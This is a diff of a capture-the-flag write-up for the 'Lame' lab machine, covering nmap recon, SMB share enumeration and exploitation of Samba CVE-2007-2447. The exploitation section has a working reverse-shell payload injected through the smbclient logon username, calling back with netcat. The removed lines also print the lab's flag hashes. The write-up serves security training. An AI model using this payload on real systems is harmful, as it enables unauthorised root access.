@@ -1,96 +1,152 @@
-# Lame
+### Recon
 
-
-# Reconnaissance
-
+Initiating reconnaissance
 ```
-scan command:
+sudo nmap -sC -sV -oA nmap/initial 10.10.10.3
+```
 
-$ nmap -Pn --script=http-tile --open $IP -oN nmapScan/init
-
-output:
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:37 -03
+With the following results:
+```
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 13:24 -03
 Nmap scan report for 10.10.10.3
-Host is up (0.18s latency).
-Not shown: 996 filtered ports
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT    STATE SERVICE
-21/tcp  open  ftp
-22/tcp  open  ssh
-139/tcp open  netbios-ssn
-445/tcp open  microsoft-ds
-
-scan command:
-
-$ sudo nmap -Pn -sV --open $IP -oN nmapScan/version
-
-output:
-
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:42 -03
-Nmap scan report for 10.10.10.3
-Host is up (0.16s latency).
-Not shown: 996 filtered ports
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+Host is up (0.23s latency).
+Not shown: 996 filtered tcp ports (no-response)
 PORT    STATE SERVICE     VERSION
 21/tcp  open  ftp         vsftpd 2.3.4
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.3
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel
+445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-scan command:
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name:
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2024-06-15T12:25:12-04:00
+|_clock-skew: mean: 2h00m20s, deviation: 2h49m44s, median: 18s
+|_smb2-time: Protocol negotiation failed (SMB2)
+```
 
-$ sudo nmap -Pn -O -p- -sV --open $IP -oN nmapScan/full
+A scan covering all ports -p- found another point of entry:
 
-output:
+```
+21/tcp   open  ftp         syn-ack ttl 63 vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.3
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey:
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+| ssh-dss AAAAB3NzaC1kc3MAAACBALz4hsc8a2Srq4nlW960qV8xwBG0JC+jI7fWxm5METIJH4tKr/xUTwsTYEYnaZLzcOiy21D3ZvOwYb6AA3765zdgCd2Tgand7F0YD5UtXG7b7fbz99chReivL0SIWEG/E96Ai+pqYMP2WD5KaOJwSIXSUajnU5oWmY5x85sBw+XDAAAAFQDFkMpmdFQTF+oRqaoSNVU7Z+hjSwAAAIBCQxNKzi1TyP+QJIFa3M0oLqCVWI0We/ARtXrzpBOJ/dt0hTJXCeYisKqcdwdtyIn8OUCOyrIjqNuA2QW217oQ6wXpbFh+5AQm8Hl3b6C6o8lX3Ptw+Y4dp0lzfWHwZ/jzHwtuaDQaok7u1f971lEazeJLqfiWrAzoklqSWyDQJAAAAIA1lAD3xWYkeIeHv/R3P9i+XaoI7imFkMuYXCDTq843YU6Td+0mWpllCqAWUV/CQamGgQLtYy5S0ueoks01MoKdOMMhKVwqdr08nvCBdNKjIEd3gH6oBk/YRnjzxlEAYBsvCmM4a0jmhz0oNiRWlc/F+bkUeFKrBx/D2fdfZmhrGg==
+|   2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAstqnuFMBOZvO3WTEjP4TUdjgWkIVNdTq6kboEDjteOfc65TlI7sRvQBwqAhQjeeyyIk8T55gMDkOD0akSlSXvLDcmcdYfxeIF0ZSuT+nkRhij7XSSA/Oc5QSk3sJ/SInfb78e3anbRHpmkJcVgETJ5WhKObUNf1AKZW++4Xlc63M4KI5cjvMMIPEVOyR3AKmI78Fo3HJjYucg87JjLeC66I7+dlEYX6zT8i1XYwa/L1vZ3qSJISGVu8kRPikMv/cNSvki4j+qDYyZ2E5497W87+Ed46/8P42LNGoOV8OcX/ro6pAcbEPUdUEfkJrqi2YXbhvwIJ0gFMb6wfe5cnQew==
+139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
-Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-25 12:46 -03
+Host script results:
+|_smb2-time: Protocol negotiation failed (SMB2)
+| smb-os-discovery:
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name:
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2024-06-15T12:32:26-04:00
+|_smb2-security-mode: Couldn't establish a SMBv2 connection.
+| p2p-conficker:
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 59488/tcp): CLEAN (Timeout)
+|   Check 2 (port 47176/tcp): CLEAN (Timeout)
+|   Check 3 (port 40169/udp): CLEAN (Timeout)
+|   Check 4 (port 47598/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 2h00m21s, deviation: 2h49m45s, median: 18s
+```
+
+### Enumeration
+
+Enumerate to determine if any of this services are either misconfigured or running vulnerable versions
+# 21/tcp  open  ftp         vsftpd 2.3.4
+A quick google search shows that this version is famously vulnerable to a backdoor command execution that is triggered by entering a string that contains the caracters ":)" as the username. When the backdoor is triggered, the target machine opens a shell on port 6200. we can look to see if nmap already has a script that checks for that with:
+```
+ls /usr/share/nmap/scripts/ftp*
+```
+Find the backdoor script and execute it on port 21 of the target machine with:
+```
+nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
+```
+
+With the following results:
+```
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-15 14:03 -03
 Nmap scan report for 10.10.10.3
-Host is up (0.13s latency).
-Not shown: 65530 filtered ports
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT     STATE SERVICE     VERSION
-21/tcp   open  ftp         vsftpd 2.3.4
-22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%)
-No exact OS matches for host (test conditions non-ideal).
+Host is up (0.23s latency).
 
+PORT   STATE SERVICE
+21/tcp open  ftp
+
+Nmap done: 1 IP address (1 host up) scanned in 22.23 seconds
 ```
 
+As we can see, the output shows that this vulnerability doesn't appear to be exploitable, so we can move to our second point of entry.
 
-# Enumeration
+# 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 
+After some google searching, nothing major pops up. Nmap contains multiple scripts that can brute force credentials amongst other things. However, this might take a while and could potentially lead nowhere so we’ll put this on the back burner and get back to it later if the other points of entry don’t pan out.
+
+# 139/tcp and 445/tcp Samba smbd 3.0.20-Debian 
+
+Using the smbclient to access the SMB server:
 ```
-There are several points of entry to the machine:
+smbclient -L 10.10.10.3
+```
+-L: lists what services are available on a server
 
-21/tcp   ftp  vsftpd 2.3.4
-Version of FTP vulnerable to backdor command execution that is treggered by entering a string that contains the characters ":)" as username
-
-22/tcp   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
-SSH probably susceptible to brute force
-
-139/tcp  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-445/tcp  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
-The Samba SMB server is accessible via smbclient with anonymous login allowed:
-
-An error will appear the first time you attempt to connect
-$ smbclient -L 10.10.10.3
-protocol negotiation failed: NT\_STATUS\_CONNECTION\_DISCONNECTED
-
-In order get it to work, edit the SMB configuration file
-	vim /etc/samba/smb.conf
-Under GLOBAL, add the two following settings:
-client min protocol = CORE
-client max protocol = SMB3
-
-Then, try again:
-$ smbclient -L 10.10.10.3
-Enter WORKGROUP\nimitzufo's password:
+Anonymous login is allowed:
+```
+$smbclient -L 10.10.10.3
+Password for [WORKGROUP\nimitzufo]:
 Anonymous login successful
 
         Sharename       Type      Comment
@@ -108,68 +164,57 @@ Anonymous login successful
 
         Workgroup            Master
         ---------            -------
-
-the /tmp share looks promising 
-
-"tmp             Disk      oh noes!"
+        WORKGROUP            LAME
 ```
 
-# Exploitation
+Look for the permissions on the share drives:
+```
+smbmap -H 10.10.10.3
+```
+-H: IP of host
 
 ```
-use smbclient to log into the box and send the reverse shell back to the attacking machine
+[+] IP: 10.10.10.3:445  Name: 10.10.10.3
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        tmp                                                     READ, WRITE     oh noes!
+        opt                                                     NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
+```
+The results show allowed READ/WRITE access on the tmp folder
 
-$ smbclient //10.10.10.3/tmp
-Enter WORKGROUP\user password:
-Anonymous login successful
+After some google searching for vulnerabilities with this Samba version several were found. We're looking for a code execution vulnerability that would ideally give us Admin access. After going through all the code execution vulnerabilities, the simplest one that won’t require me to use Metasploit is CVE-2007–2447.
+The issue seems to be with the username field. If we send shell metacharacters into the username we exploit a vulnerability which allows us to execute arbitrary commands. Although the exploit available on exploitdb uses Metasploit, reading through the code tells us that all the script is doing is running the following command, where “payload.encoded” would be a reverse shell sent back to our attack machine.
+```
+"/=`nohup " + payload.encoded + "`"
+```
 
-on another terminal, set up a listener to receive the incoming shell
+### Exploitation
 
-	nc -lnvp 64444
-	Listening on 0.0.0.0 64444
+Add a listener on the attack machine:
+```
+nc -nlvp 4444
+```
 
-back on smb, place the payload and wait for the shell
+Log into the smb client
+```
+smbclient //10.10.10.3/tmp
+```
 
-Try "help" to get a list of possible commands.
-smb: \> logon "/=`nc 10.10.14.3 64444 -e /bin/sh`"
-Password:
+Send shell metacharacters into the username with a reverse shell payload.
+```
+logon "/=`nohup nc -nv 10.10.14.3 4444 -e /bin/sh`"
+```
 
-Connection received on 10.10.10.3 48210"
-ls
-bin
-boot
-cdrom
-dev
-etc
-home
-initrd
-initrd.img
-initrd.img.old
-lib
-lost+found
-media
-mnt
-nohup.out
-opt
-proc
+And get a shell:
+```
+listening on [any] 4444 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.3] 41179
+uname -a
+Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
+whoami
 root
-sbin
-srv
-sys
-tmp
-usr
-var
-vmlinuz
-vmlinuz.old
 
-no privilege escalation is required since we're already root
 
-find / -type f -iname "root.txt" 2\>/dev/null
-/root/root.txt
-find / -type f -name "user.txt" 2\>/dev/null
-/home/makis/user.txt
-cat /home/makis/user.txt
-3329cb44627fd02d8c79c64806b5724f
-cat /root/root.txt
-8b0628c1421d201a6b88b0344ae412b3
-```
